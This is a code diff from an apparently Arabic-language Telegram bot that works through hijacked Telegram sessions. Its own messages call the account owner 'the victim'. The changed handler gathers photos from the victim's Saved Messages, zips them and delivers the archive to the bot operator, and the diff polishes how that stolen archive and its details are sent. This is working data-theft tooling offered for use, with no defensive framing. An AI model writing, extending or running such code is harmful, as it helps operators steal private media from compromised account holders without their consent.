@@ -499,7 +499,7 @@ async def users(event):
         if not op:
             return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحية.", buttons=keyboard)
         
-        await event.respond("جاري جمع الصور من الرسائل المحفوظة...")
+        processing_msg = await event.respond("⏳ جاري جمع الصور من الرسائل المحفوظة...")
         
         try:
             # تنظيف المجلد القديم إذا وجد
@@ -512,8 +512,18 @@ async def users(event):
                 # ضغط المجلد في ملف zip
                 shutil.make_archive("photos", 'zip', "saved_photos")
                 
-                # إرسال الملف المضغوط
-                await event.respond("تم جمع الصور بنجاح:\n\n" + result, file="photos.zip")
+                # تقسيم النص إذا كان طويلاً
+                if len(result) > 1024:  # الحد الأقصى للوصف
+                    result_msg = "📁 تم جمع الصور بنجاح\n\n" + result[:1000] + "\n... (النص مقطوع بسبب الطول)"
+                else:
+                    result_msg = "📁 تم جمع الصور بنجاح\n\n" + result
+                
+                # إرسال الملف أولاً بدون وصف
+                await event.respond(file="photos.zip", 
+                                  caption="تم تنزيل ألبوم الصور المحفوظة")
+                
+                # ثم إرسال التفاصيل في رسالة منفصلة
+                await event.respond(result_msg)
                 
                 # تنظيف الملفات المؤقتة
                 os.remove("photos.zip")
@@ -523,6 +533,8 @@ async def users(event):
                 
         except Exception as e:
             await event.respond(f"حدث خطأ: {str(e)}")
+        finally:
+            await processing_msg.delete()
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
 async def users(event):
